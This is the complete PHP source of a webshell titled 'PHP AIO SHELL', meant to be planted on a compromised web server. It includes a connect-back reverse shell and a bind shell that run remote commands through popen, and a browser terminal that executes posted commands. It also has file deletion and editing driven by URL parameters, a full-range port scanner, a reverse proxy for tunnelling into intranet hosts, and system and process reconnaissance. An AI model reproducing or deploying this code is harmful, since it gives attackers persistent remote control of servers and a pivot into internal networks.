<?php
session_start();
error_reporting(E_ALL);
function read_file($file_name)
{
	$fp = fopen($file_name, "r");
	if ($fp == false) {
		echo "open $file_name failed.\n";
		return -1;
	}
	while (($buf = fgets($fp, 1024)) != false ) {
		echo $buf;
	}
	
	fclose($fp);
	return 0;
}
function copy_file($src_file, $dst_file)
{
	$src_fp = fopen($src_file, "r");
	if ($src_fp == false) {
		echo "open $src_file failed.\n";
		return -1;
	}
	$dst_fp = fopen($dst_file, "w+");
	if ($dst_fp == false) {
		fclose($src_fp);
		return -1;
	}
	while (($buf = fgets($src_fp, 1024)) != false) {
		if (fwrite($dst_fp, $buf, strlen($buf)) == false) {
			echo "fwrite failed.\n";
			fclose($src_fp);
			fclose($dst_fp);
			return -1;
		}
	}
	fclose($src_fp);
	fclose($dst_fp);
	return 0;
}
function copy_file_binary($src_file, $dst_file)
{
	if (file_exists($src_file) == false) {
		echo "file $src_file not exist.\n";
		return -1;
	}
	if (copy($src_file, $dst_file) == false) {
		echo "copy $src to $dst_file failed.\n";
		return -1;
	}
	echo "copy $src_file to $dst_file ok.\n";
	return 0;
}
function delete_file($file_name)
{
	if (file_exists($file_name) == false) {
		echo "file $file_name not exist.";
		return -1;
	}
	if (unlink($file_name) == false) {
		echo "delete $file_name failed.";
		return -1;
	}
	echo "delete $file_name ok.\n";
	return 0;
}
function edit_file($file_path)
{
	$file_name = basename($file_path);
	if (empty($_POST['newcontent'])) {
		echo '<form action="" method="post">';
		$fp=@fopen($file_name, "r");
		$data=@fread($fp, filesize($file_name));
	
		echo '<textarea name="newcontent" cols="80" rows="20" >';
		echo $data;
		@fclose($fp);
		echo '</textarea>
		<input type="submit" value="Edit"/>
		</form>';
	}
	else {
		$fp=@fopen($file_name, "w+");
		$result=@fwrite($fp, $_POST['newcontent']);
		@fclose($fp);
		if ($result == false) {
			echo "edit failed.";
		}
		else {
			echo "edit ok.";
		}
	}
}
function rename_file($old_file_name, $new_file_name)
{
	if (file_exists($old_file_name) == false) {
		echo "file $old_file_name not exist.\n";
		return -1;
	}
	if (rename($old_file_name, $new_file_name) == false) {
		echo "rename $old_file_name to $new_file_name failed.\n";
		return -1;
	}
	echo "rename $old_file_name to $new_file_name ok.\n";
	return 0;
}
function get_human_size($bytes)
{
	$type=array("Bytes", "KB", "MB", "GB", "TB");
	$idx=0;
	while ($bytes >= 1024) {
		$bytes /= 1024;
		$idx++;
	}
	return (intval($bytes)." ".$type[$idx]);
}
function get_file_perms($file_name)
{
	return (substr(sprintf('%o', fileperms($file_name)), -4));
}
function get_human_file_perms($file_name)
{
	$perms = fileperms($file_name);
	if (($perms & 0xC000) == 0xC000) {
    		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
    		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
    		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		$info = 'p';
	} else {
		$info = 'u';
	}
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
		(($perms & 0x0800) ? 's' : 'x' ) :
		(($perms & 0x0800) ? 'S' : '-'));
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
		(($perms & 0x0400) ? 's' : 'x' ) :
		(($perms & 0x0400) ? 'S' : '-'));
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
		(($perms & 0x0200) ? 't' : 'x' ) :
		(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
function get_file_owner($file_name)
{
	$uid=fileowner($file_name);
        $user_info = posix_getpwuid($uid);
        return $user_info['name'];
}
function read_dir($dir_path)
{
	if (is_dir($dir_path)) {
		if (($dp = opendir($dir_path)) == false) {
			echo "open $dir_path failed.\n";
			return -1;
		}
		while (($file_name = readdir($dp)) != false) {
			if ($file_name == "." || $file_name == "..")
				continue;
			$sub_path = $dir_path."/".$file_name;
			echo "$sub_path\n";
		}
	}
	closedir($dp);
	return 0;
}
function read_dirs($dir_path)
{
	echo '
<table>
<tr class="banner">
<td width="400" >Filename</td>
<td width="400" >Last modified</td>
<td width="400" >Size</td>
<td width="400" >Chmod/Perms</td>
<td width="400" >Action</td>
</tr>';
        if (is_dir($dir_path)) {
                if (($dp = opendir($dir_path)) == false) {
                        echo "open $dir_path failed.\n";
                        return -1;
                }
                while (($file_name = readdir($dp)) != false) {
                        if ($file_name == "." || $file_name == "..")
                                continue;
                        $sub_path = $dir_path."/".$file_name;
			$last_modify_time=date("Y/m/d H:i:s", fileatime($file_name));
			$file_size=filesize($file_name);
			$file_size_string=get_human_size($file_size);
			$file_perms=get_file_perms($file_name);
			$file_perms_string=get_human_file_perms($file_name);
			$file_owner=get_file_owner($file_name);
			
			echo '<tr class="directory">
			<td width="400" ><a href='.$file_name.'>'.$file_name.'</a></td>
			<td width="400" >'.$last_modify_time.'</td>
			<td width="400" >'.$file_size_string.'</td>
			<td width="400" >'.$file_perms.' / '.$file_perms_string.' / '.$file_owner.'</td>
			<td width="400" ><a href="webshell.php?delete='.$file_name.'"'.'>Delete </a>
				<a href="webshell.php?edit='.$file_name.'"'.'>Edit </a>
				<a href="webshell.php?download='.$file_name.'"'.'>Download </a>
				<a href="webshell.php?rename='.$file_name.'"'.'>Rename </a>
			</td>
			</tr>';
                }
        }
	echo '</table>';
        closedir($dp);
        return 0;
}
function aio_directory()
{
	$curr_path=getcwd();
	return read_dirs($curr_path);
}
function search_file_by_name($dir_path, $target_file)
{
        if (is_dir($dir_path)) {
                if (($dp = opendir($dir_path)) == false) {
                        echo "open $dir_path failed.\n";
                        return -1;
                }
                while (($file_name = readdir($dp)) != false) {
                        if ($file_name == "." || $file_name == "..")
                                continue;
                        $sub_path = $dir_path."/".$file_name;
                        if (is_dir($sub_path)) {
                                search_file_by_name($sub_path, $target_file);
                        }
			if (!strcmp($file_name, $target_file)) {
				echo "found $target_file.\n";
				closedir($dp);
				return 0;
			}
                }
		echo "not found $target_file.\n";
        	closedir($dp);
        }
        return -1;
}
/**
 * show file attribute with cetern flag.
 *
 * @dir_path - directroy to search.
 * @attr_flag - 0 readable.
 *            - 1 writeable.
 *            - 2 executable.
 */
function show_attr_file($dir_path, $attr_flag)
{
        if (is_dir($dir_path)) {
                if (($dp = opendir($dir_path)) == false) {
                        echo "open $dir_path failed.\n";
                        return -1;
                }
                while (($file_name = readdir($dp)) != false) { 
                        if ($file_name == "." || $file_name == "..")
                                continue;
                        $sub_path = $dir_path."/".$file_name;
                        if (is_dir($sub_path)) {
                                show_attr_file($sub_path, $attr_flag);
                        }
		
			if ($attr_flag == 0) {
				if (is_readable($file_name)) 
					echo "$sub_path\n";
			}
			else if ($attr_flag == 1) {
				if (is_writable($file_name)) 
					echo "$sub_path\n";
			}
			else if ($attr_flag == 2) {
				if (is_executable($file_name)) 
					echo "$sub_path\n";
			}
			else {
				echo "wrong attribute flag.\n";
				break;
			}
		}
		closedir($dp);
	}
	return 0;
}
function create_dir($dir_path)
{
	if (file_exists($dir_path))
		return -1;
	if (mkdir($dir_path, 0700) == false) {
		echo "create $dir_path failed.\n";
		return -1;
	}
	echo "create $dir_path ok.\n";
	return 0;
}
function destroy_dir($dir_path)
{
	if (file_exists($dir_path) == false)
		return -1;
	if (rmdir($dir_path) == false) {
		echo "delete $dir_path failed.\n";
		return -1;
	}
	echo "delete $dir_path ok.\n";
	return 0;
}
function destroy_dirs($dir_path)
{
        if (is_dir($dir_path)) {
                if (($dp = opendir($dir_path)) == false) {
                        echo "open $dir_path failed.\n";
                        return -1;
                }
                while (($file_name = readdir($dp)) != false) {
                        if ($file_name == "." || $file_name == "..")
                                continue;
                        $sub_path = $dir_path."/".$file_name;
                        if (is_dir($sub_path)) {
                                destroy_dirs($sub_path);
                        }
			else
				delete_file($sub_path);
                }
        	closedir($dp);
		destroy_dir($dir_path);
        	return 0;
        }
        return 0;
}
function linux_id()
{
	$uid = posix_getuid();
	$user_info = posix_getpwuid($uid);
	echo "uid=".$uid."(".$user_info['name'].") ";
	echo "gid=".$user_info['gid']."(".$user_info['name'].") ";
	echo "dir=".$user_info['dir']." ";
	echo "shell=".$user_info['shell']."\n";
}
function linux_uname()
{
	$uname = posix_uname();
	echo $uname['sysname']." ".$uname['nodename']." ".$uname['release']." ";
	echo $uname['version']." ".$uname['machine'];
}
function get_proc_name($file_name)
{
        $fp = fopen($file_name, "r");
        if ($fp == false) {
                echo "open $file_name failed.\n";
                return -1;
        }
        while (($buf = fgets($fp, 1024)) != false ) {
		if (strstr($buf, "Name:") != NULL) {
			sscanf($buf, "%s %s", $tmp, $name);
			fclose($fp);
			return $name;
		}
        }
        fclose($fp);
        return 0;
}
function get_proc_cmd($file_name)
{
        $fp = fopen($file_name, "r");
        if ($fp == false) {
                echo "open $file_name failed.\n";
                return -1;
        }
	$cmd = fgets($fp, 1024);
	fclose($fp);
	return $cmd;
}
function linux_ps()
{
	if (($dp = opendir("/proc")) == false) {
		echo "open /proc failed.\n";
		return -1;
	}
	echo "open /proc ok.\n";
        while (($file_name = readdir($dp)) != false) {
        	if ($file_name == "." || $file_name == "..")
        		 continue;
		if (ctype_digit($file_name) == false)
			continue;
		
		$dir_path = "/proc/$file_name/status";
		$proc_name = get_proc_name($dir_path);
		$dir_path = "/proc/$file_name/cmdline";
		$proc_cmd = get_proc_cmd($dir_path);
		echo $file_name."\t\t".$proc_name." ".$proc_cmd."\n";
	}
	closedir($dp);
	return 0;
}
function tcp_connect($host, $port)
{
	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	if ($socket == false) {
		echo "create socket error.\n";
		return -1;
	}
	if (@socket_connect($socket, $host, $port) == false) {
		socket_close($socket);
		return -1;
	}
	return $socket;
}
function tcp_connect_timeout($host, $port, $timeout)
{
	$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
	if ($socket == false) {
		echo "create socket error.\n";
		return -1;
	}
	if (socket_set_nonblock($socket) == false) {
		echo "set nonblock error.\n";
		socket_close($socket);
		return -1;
	}
	$time = time();
	while (!@socket_connect($socket, $host, $port)) {
		$err = socket_last_error($socket);
		if ($err == 115 || $err == 114) {
			if ((time() - $time) >= $timeout) {
				socket_close($socket);
				echo "socket timeout.\n";
				return -1;
			}
			sleep(1);
			continue;
		}
		socket_close($socket);
		return -1;
	}
	
	echo "connect to $host:$port ok.\n";
	return $socket;
}
function run_proxy_client($remote_host1, $remote_port1, $remote_host2, $remote_port2)
{
        $socket1 = tcp_connect($remote_host1, $remote_port1);
        if ($socket1 == -1) {
                echo "connect to $remote_host1:$remote_port1 failed.\n";
                return -1;
        }
        echo "connect to $remote_host1:$remote_port1 ok.\n";
        $socket2 = tcp_connect($remote_host2, $remote_port2);
        if ($socket2 == -1) {
                echo "connect to $remote_host2:$remote_port2 failed.\n";
                socket_close($socket1);
                return -1;
        }
        echo "connect to $remote_host2:$remote_port2 ok.\n";
        run_proxy_core($socket1, $remote_host1, $socket2, $remote_host2);
        return 0;
}
function web_proxy_client()
{
        echo '<html><head><style>
                h3.banner
                {
                text-align:center;
                color:#384850;
                font-weight:bold;
                }
                form
                {
                text-align:center;
                }
                input[type=text]
                {
                width:300px;
                color:#384850;
                background-color:#ffffff;
                }
                input[type=submit]
                {
                width:80px;
                color:#384850;
                background-color:#ffffff;
                }
                </head></style>
                <body>
		<h3 class="banner">Linux reverse proxy</h3>
                <form action="" method="post">
		<b>intranet host</b>
                <input type="text" name="intranet_host" />
                <b>intranet port</b>
                <input type="text" name="intranet_port" /><br />
		<b>public host</b>
                <input type="text" name="public_host" />
                <b>public   port</b>
                <input type="text" name="public_port" /><br /><br />
                <input type="submit" value="Run" />
                </form>
                </body>
                </html>';
        if (empty($_POST['intranet_host']) || empty($_POST['intranet_port']) || 
		empty($_POST['public_host']) ||  empty($_POST['public_port']))
                return -1;
	run_proxy_client($_POST['intranet_host'], $_POST['intranet_port'],
			$_POST['public_host'], $_POST['public_port']);
}
function run_proxy_core($socket1, $remote_host1, $socket2, $remote_host2)
{
        while (true) {
                $read_sockets = array($socket1, $socket2);
                $write_sockets = NULL;
                $except_sockets = NULL;
                if (socket_select($read_sockets, $write_sockets, $except, 0) == -1) {
                        echo "socket_select error ".socket_strerror(socket_last_error())."\n";
                        break;
                }
                if (in_array($socket2, $read_sockets)) {
                        //echo "got data from $remote_host2.\n";
                        $bytes2 = socket_recv($socket2, $buf2, 1024, MSG_DONTWAIT);
                        if ($bytes2 == false) {
                                echo "socket_recv ".socket_strerror(socket_last_error($socket2))."\n";
                                break;
                        }
                        //echo "got bytes $bytes2.\n";
                        if ($bytes2 == 0) {
                                echo "recv no data from $remote_host2.\n";
                                break;
                        }
                        $ret2 = socket_send($socket1, $buf2, $bytes2, MSG_EOR);
                        if ($ret2 == false) {
                                echo "socket_send ".socket_strerror(socket_last_error($socket1))."\n";
                                break;
                        }
                        if ($ret2 != $bytes2) {
                                echo "send data failed.\n";
                                break;
                        }
                        //echo "write $ret2 bytes ok.\n";
                }
                if (in_array($socket1, $read_sockets)) {
                        //echo "got data from $remote_host1.\n";
                        $bytes1 = socket_recv($socket1, $buf1, 1024, MSG_DONTWAIT);
                        if ($bytes1 == false) {
                                echo "socket_recv ".socket_strerror(socket_last_error($socket1))."\n";
                                break;
                        }
                        //echo "got bytes $bytes1.\n";
                        if ($bytes1 == 0) {
                                echo "recv no data from $remote_host1.\n";
                                break;
                        }
                        $ret1 = socket_send($socket2, $buf1, $bytes1, MSG_EOR);
                        if ($ret1 == false) {
                                echo "socket_send ".socket_strerror(socket_last_error($socket2))."\n";
                                break;
                        }
                        if ($ret1 != $bytes1) {
                                echo "send data failed.\n";
                                break;
                        }
                        //echo "write $ret1 bytes ok.\n";
                }
        }
        echo "proxy done.\n";
        socket_close($socket1);
        socket_close($socket2);
        return 0;
}
function init_proxy_server($local_port)
{
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket == false) {
                echo "create socket error.\n";
                return -1;
        }
        if (socket_bind($socket, '0', $local_port) == false) {
                echo "bind sock error.\n";
                socket_close($socket);
                return -1;
        }
        if (socket_listen($socket) == false) {
                echo "listen sock error.\n";
                socket_close($socket);
                return -1;
        }
        echo "listen on port $local_port ok.\n";
        return $socket;
}
function run_proxy_server($local_port1, $local_port2)
{
        $socket1 = init_proxy_server($local_port1);
        if ($socket1 == -1)
                return -1;
        while (true) {
                if (($newsock1 = socket_accept($socket1)) !== false) {
                        socket_getpeername($newsock1, $ip1);
                        echo "got a client form $ip1\n";
                        break;
                }
        }
        $socket2 = init_proxy_server($local_port2);
        if ($socket2 == -1)
                return -1;
        while (true) {
                if (($newsock2 = socket_accept($socket2)) !== false) {
                        socket_getpeername($newsock2, $ip2);
                        echo "got a client form $ip2\n";
                        break;
                }
        }
        echo "start transmit data ...\n";
        run_proxy_core($newsock2, $ip2, $newsock1, $ip1);
        socket_close($socket2);
        socket_close($socket1);
        return 0;
}
function tcp_connect_port($host, $port, $timeout)
{
	$fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
		
	return $fp;
}
function port_scan_fast($host, $timeout, $banner)
{
$general_ports = array(
		'21'=>'FTP',
		'22'=>'SSH',
		'23'=>'Telnet',
		'25'=>'SMTP',
		'79'=>'Finger',
		'80'=>'HTTP',
		'81'=>'HTTP/Proxy',
		'110'=>'POP3',
		'135'=>'MS Netbios',
		'139'=>'MS Netbios',
		'143'=>'IMAP',
		'162'=>'SNMP',
		'389'=>'LDAP',
		'443'=>'HTTPS',
		'445'=>'MS SMB',
		'873'=>'rsync',
		'1080'=>'Proxy/HTTP Server',
		'1433'=>'MS SQL Server',
		'2433'=>'MS SQL Server Hidden',
		'1521'=>'Oracle DB Server',
		'1522'=>'Oracle DB Server',
		'3128'=>'Squid Cache Server',
		'3129'=>'Squid Cache Server',
		'3306'=>'MySQL Server',
		'3307'=>'MySQL Server',
		'3500'=>'Squid Cache Server',
		'3389'=>'MS Terminal Service',
		'5800'=>'VNC Server',
		'5900'=>'VNC Server',
		'8080'=>'Proxy/HTTP Server',
		'10000'=>'Webmin',
		'11211'=>'Memcached'
		);
	echo '<table>';
		
	foreach($general_ports as $port=>$name) {
		if (($fp = tcp_connect_port($host, $port, $timeout)) != false) {
			if (empty($banner) == false) {
				$data = fgets($fp, 128);
				echo '<tr>
					<td>'.$host.'</td>
					<td>'.$port.'</td>
					<td>'.$name.'</td>
					<td>'.$data.'</td>
					</tr>';
			}
			else {
				echo '<tr>
					<td>'.$host.'</td>
					<td>'.$port.'</td>
					<td>'.$name.'</td>
					</tr>';
			}
			fclose($fp);
		}
	} 
	echo '</table>';
}
function port_scan($host, $src_port, $dst_port, $timeout, $banner)
{
	echo '<table>
		<tr>
		<td>Host</td>
		<td>Port</td>
		<td>State</td>
		</tr>';
        for ($port = $src_port; $port <= $dst_port; $port++) {
		if (($fp = tcp_connect_port($host, $port, $timeout)) != false) {
			if (empty($banner) == false) {
				$data = fgets($fp, 128);
				echo '<tr>
					<td>'.$host.'</td>
					<td>'.$port.'</td>
					<td>'.$data.'</td>
					</tr>';
			}
			else {
				echo '<tr>
					<td>'.$host.'</td>
					<td>'.$port.'</td>
					<td>OPEN</td>
					</tr>';
			}
			fclose($fp);
		}
        }
	echo '</table>';
}
function run_portscan()
{
	echo '<html>
		<head>
		<style>
		tr.directory
		{
		font-size:14px;
		text-align:left;
		height:20px;
		border:1px solid #98bf21;
		padding:2px 6px 2px 6px;
		}
		</style>
		</head>
		<body>
		<form action="" method="post">
		target host
		<input type="text" name="scan_host" value="127.0.0.1" />
		timeout
		<input type="text" name="scan_timeout" value="5" />
		general ports
		<input type="checkbox" name="scan_fast" />
		banner
		<input type="checkbox" name="scan_banner" />
		<input type="submit" value="scan" />
		</form>
		</body>
		</html>';
	if (empty($_POST['scan_host']))
		return -1;
	
	if (isset($_POST['scan_fast'])) {
		port_scan_fast($_POST['scan_host'], $_POST['scan_timeout'], 
				$_POST['scan_banner']);
	}
	else {
		port_scan($_POST['scan_host'], "1", "65535", 
				$_POST['scan_timeout'], 
				$_POST['scan_banner']);
	}
}
function linux_exec($socket, $cmd)
{
        $handle = popen($cmd, "r");
        while (($buf = fgets($handle, 1024)) != false) {
                $ret = socket_write($socket, $buf, strlen($buf));
                if ($ret == false) {
                        return -1;
                }
        }
        pclose($handle);
        return 0;
}
function connect_backdoor($host, $port)
{
        $banner = "connect back from phpshell\n";
        $socket = tcp_connect($host, $port);
        if ($socket == -1) {
		echo "connect to $host:$port failed.\n";
                return -1;
	}
	echo "connect to $host:$port ok.\n";
        $ret = socket_write($socket, $banner, strlen($banner));
        if ($ret == false) {
		echo "write data failed.\n";
                socket_close($socket);
                return -1;
        }
        while (true) {
                $buf = socket_read($socket, 1024);
                echo $buf;
                linux_exec($socket, $buf);
        }
}
function bindshell($local_port)
{
        $banner = "bindshell from phpshell\n";
        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        if ($socket == false) {
                echo "create socket error.\n";
                return -1;
        }
        if (socket_bind($socket, '0', $local_port) == false) {
                echo "bind sock error.\n";
                socket_close($socket);
                return -1;
        }
        if (socket_listen($socket) == false) {
                echo "listen sock error.\n";
                socket_close($socket);
                return -1;
        }
        echo "listen on port $local_port ok.\n";
        while (true) {
                if (($newsock = socket_accept($socket)) !== false) {
                        socket_getpeername($newsock, $ip);
                        echo "got a client form $ip"."<br />";
                        break;
                }
        }
        $ret = socket_write($newsock, $banner, strlen($banner));
        if ($ret == false) {
                echo "write data failed.\n";
                socket_close($newsock);
                socket_close($socket);
                return -1;
        }
        while (true) {
                $buf = socket_read($newsock, 1024);
                echo $buf;
                linux_exec($newsock, $buf);
        }
	socket_close($newsock);
	socket_close($socket);
	return 0;
}
function run_backdoor()
{
        echo '<html><head><style>
		h3.banner
		{
		text-align:center;
		color:#384850;
		font-weight:bold;
		}
		form
		{
		text-align:center;
		}
                input[type=text]
                {
                width:300px;
                color:#384850;
                background-color:#ffffff;
                }
                input[type=submit]
                {
                width:80px;
                color:#384850;
                background-color:#ffffff;
                }
		</head></style>
                <h3 class="banner" >Linux connect backdoor</h3>
                <form action="" method="post">
                Target host
                <input type="text" name="target_host" />
                Target port
                <input type="text" name="target_port" />
                <input type="submit" value="Connect" />
                </form>
		</br />
                <h3 class="banner" >Linux bindshell backdoor</h3>
                <form action="" method="post">
		Bind port
                <input type="text" name="bind_port" />
                <input type="submit" value="Bindshell" />
                </form>
		</html>';
        if ($_POST['target_host'] && $_POST['target_port']) {
                connect_backdoor($_POST['target_host'], $_POST['target_port']);
        }
	if ($_POST['bind_port']) {
		bindshell($_POST['bind_port']);
	}
}
/*
function exec_shell($cmd)
{
        $handle = popen($cmd, "r");
        while (($buf = fgets($handle, 1024)) != false) {
		echo $buf;
        }
        pclose($handle);
        return 0;
}
function run_shell()
{
	$host_name = gethostbyaddr($_SERVER['SERVER_NAME']);
        $uid = posix_getuid();
        $user_info = posix_getpwuid($uid);
	echo '<html>
		<head>
		<style>
                input[type=text]
                {
                width:1130px;
                color:#384850;
                background-color:#ffffff;
                }
		textarea
		{
                width:1130px;
                color:#384850;
                background-color:#ffffff;
		}
		</style>
		</head>
		<body>
		<form action="" method="post">
		<font color="#384850">'.$user_info['name'].'@'.$host_name.'$</font>
		<input style="border:none" color="#384850" type="text" name="shellcmd" />
		<input style="border:none" color="#384850" type="submit" value="Execute" /><br /><br />
		<textarea name="textarea" cols="150" rows="30" readonly>';
	if ($_POST['shellcmd']) {
		//echo $user_info['name'].'@'.$host_name.'$';
		//echo $_POST['shellcmd'];
		exec_shell($_POST['shellcmd']);
		echo '</textarea></form></body></html>';
	}
}
*/
function run_terminal_shell($cmd)
{
        $handle = popen($cmd, "r");
        while (($buf = fgets($handle, 1024)) != false) {
                $data .= $buf."";
        }
        pclose($handle);
        return $data;
}
function aio_shell()
{
        $host_name = gethostbyaddr($_SERVER['SERVER_NAME']);
        $uid = posix_getuid();
        $user_info = posix_getpwuid($uid);
	$curr_path = getcwd();
	$prompt=$user_info['name'].'@'.$host_name.':'.$curr_path;
        echo '<html>
        <head>
        <style>
        tr.banner
        {
        font-size: 18px;
        font-style:italic;
        color:#ffffff;
        background-color: #285070;
        }
        tr.prompt
        {
        font-size: 14px;
        color:#285800;
        background-color: #000000;
        }
        textarea {border: none; margin: 0px; padding: 2px 2px 2px; color: #285800; background-color: #000000;}
        input
        {
        color: #285800; background-color: #000000;
        }
        </style>
        <script type="text/javascript" language="JavaScript">
        function init()
        {
                document.shell.output.scrollTop = document.shell.output.scrollHeight;
        }
        </script>
        </head>
        <body onload="init()">
        <table align="center" border="0" width="600" cellpadding="0" cellspacing="0">
        <tr class="banner">
                <td width="10%"><b>TERMINAL</b></td>
                <td align="center">'.$prompt.'</td>
        </tr>
        <form name="shell" action="" method="post">
        <tr class="prompt">
        <td colspan="2" nowrap>
        <textarea name="output" rows="20" cols="90">';
        if ($_POST['shellcmd']) {
                $cmd_data = $prompt.'$'.$_POST['shellcmd']."\n";
                $cmd_data .= run_terminal_shell($_POST['shellcmd']);
                $_SESSION['output'] .= $cmd_data;
                echo $_SESSION['output'];
        }
        echo '</textarea><br />'.$prompt.'$'.'
        <input style="border:none" type="text" name="shellcmd" />
        <input style="border:none" type="submit" value="" />
</td>
</tr>
</form>
<tr class="banner">
        <td align="center" height="20" colspan="2"> &copy wzt 2014 http://www.cloud-sec.org</td>
</tr>
</table>
</body>
</html>';
}
function webshell_main()
{
	if (isset($_GET['cmd'])) {
		if ($_GET['cmd'] == "backdoor") {
			run_backdoor();
		}
		if ($_GET['cmd'] == "shell") {
			aio_shell();
		}
		if ($_GET['cmd'] == "portscan") {
			run_portscan();
		}
		if ($_GET['cmd'] == "proxy") {
			web_proxy_client();
		}
	}
	else {
		echo '<html>
		<body>
		<table border="0" cellpadding="10"  cellspacing="20">
		<tr>
		<td><a href="webshell.php?cmd=showdir">show directorys</a></td>
		<td><a href="webshell.php?cmd=backdoor">connect backdoor</a></td>
		<td><a href="webshell.php?cmd=portscan">port scan</a></td>
		<td><a href="webshell.php?cmd=proxy">reverse proxy</a></td>
		<td><a href="webshell.php?cmd=shell">cmd shell</a></td>
		</tr>
		</body>
		</html>';
	}
}
function aio_main()
{
	$uid = posix_getuid();
	$user_info = posix_getpwuid($uid);
	$uid_banner="uid=".$uid."(".$user_info['name'].") ".
                	"gid=".$user_info['gid']."(".$user_info['name'].") ".
                	"dir=".$user_info['dir']." ".
                	"shell=".$user_info['shell'];
	$uname = posix_uname();
	$uname_banner=$uname['sysname']." ".$uname['nodename']." ".$uname['release']." ".
                	$uname['version']." ".$uname['machine'];
	$server_addr=$_SERVER['SERVER_NAME'];
	$server_port= $_SERVER['SERVER_PORT'];
	$server_time=date("Y/m/d h:i:s",time());
	$phpsoft=$_SERVER['SERVER_SOFTWARE'];
	$php_version=PHP_VERSION;
	$zend_version=zend_version();
	$dis_func=get_cfg_var("disable_functions");
	$safemode=@ini_get('safe_mode');
	if ($safemode == false)
		$safemode="On";
	$cwd_path=getcwd();
	$total_disk=disk_total_space("/");
	$total_disk_gb=intval($total_disk/(1024*1024*1024));
	$free_disk=disk_free_space("/");
	$free_disk_gb=intval($free_disk/(1024*1024*1024));
echo '<html>
<head>
<style>
body
{
background-color:#FFFFFF;
}
ul.banner
{
list-style-type:none;
margin:0;
padding:0;
text-align:center;
color:#384850;
background-color:gray;
font-size:20px;
font-weight:bold;
}
ul.directory
{
font-size:14px;
text-align:left;
font-weight: bold;
}
li
{
display:inline;
}
a:link
{
color:#384850;
}
a:visited
{
color:#384850;
}
a:hover
{
color:#384850;
}
a:active
{
color:#384850;
}
h2.banner
{
text-align:center;
color:#384850;
font-weight:bold;
}
table.banner
{
font-size:14px;
}
tr.banner
{
font-size:16px;
color:#384850;
background-color:gray;
}
tr.directory
{
font-size:14px;
text-align:left;
height:20px;
border:1px solid #98bf21;
padding:2px 6px 2px 6px;
}
p.banner
{
font-size:14px;
}
</style>
</head>
<body>
<h2 class="banner">PHP AIO SHELL</h2>
<hr />
<table class="banner">
<tr>
<td width="1200" >User: '.$uid_banner.'</td>
<td width="200" align="center" >'.$server_time.'</td>
</tr>
<tr>
<td width="1200" >Uname: '.$uname_banner.'</td>
<td width="200" align="center" >'.$server_addr.":".$server_port.'</td>
</tr>
</table>
<hr />
<p class="banner">Software: '.$phpsoft.' | PHP: '.$php_version.' | ZEND: '.$zend_version.'
 | Safemode: '.$safemode.' | disfunc: '.$dis_func.'
</p>
<table class="banner">
<tr>
<td width="200" align="left">Directroy: '.$cwd_path.'</td>
<td width="200" >Disk: total '.$total_disk_gb.'GB free '.$free_disk_gb.'GB </td>
</tr>
</table>
<br />
<ul class="banner">
<li><a href="webshell.php?cmd=dir">[Directorys]</a></li>
<li><a href="webshell.php?cmd=backdoor">[Backdoor]</a></li>
<li><a href="webshell.php?cmd=portscan">[PortScan]</a></li>
<li><a href="webshell.php?cmd=proxy">[Proxy]</a></li>
<li><a href="webshell.php?cmd=shell">[Shell]</a></li>
<li><a href="webshell.php?cmd=crack">[Crack]</a></li>
<li><a href="webshell.php?cmd=mysql">[Mysql]</a></li>
</ul>
<br />
</body>
</html>';
        if ($_GET['cmd']) {
		if ($_GET['cmd'] == "dir") {
			aio_directory();
		}
                if ($_GET['cmd'] == "backdoor") {
                        run_backdoor();
                }
                if ($_GET['cmd'] == "shell") {
                        aio_shell();
                }
                if ($_GET['cmd'] == "portscan") {
                        run_portscan();
                }
                if ($_GET['cmd'] == "proxy") {
                        web_proxy_client();
                }
        }
	if ($_GET['delete']) {
		delete_file($_GET['delete']);	
	}
	if ($_GET['edit']) {
		edit_file($_GET['edit']);
	}
}
aio_main();
?>
